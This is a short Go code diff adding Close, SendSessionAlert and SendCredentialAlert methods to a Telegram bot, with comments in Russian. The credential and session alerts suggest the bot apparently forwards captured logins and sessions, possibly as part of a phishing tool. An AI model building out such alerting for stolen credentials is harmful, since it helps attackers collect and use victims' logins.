@@ -397,8 +397,26 @@ func (b *Bot) IsEnabled() bool {
 func (b *Bot) UpdateChatID(chatID int64) {
 	b.mu.Lock()
 	defer b.mu.Unlock()
-	
+
 	b.chatID = chatID
 	b.logger.Info("Telegram bot chat ID updated",
 		zap.Int64("chat_id", chatID))
+}
+
+// Close останавливает бота
+func (b *Bot) Close() {
+	b.Stop()
+}
+
+// SendSessionAlert отправляет уведомление о сессии
+func (b *Bot) SendSessionAlert(session *database.Session) error {
+	b.NotifySession(session)
+	return nil
+}
+
+// SendCredentialAlert отправляет уведомление о креденшалах
+func (b *Bot) SendCredentialAlert(creds *database.Credentials) error {
+	session := &database.Session{ID: creds.SessionID}
+	b.NotifyCredentials(session, creds)
+	return nil
 }
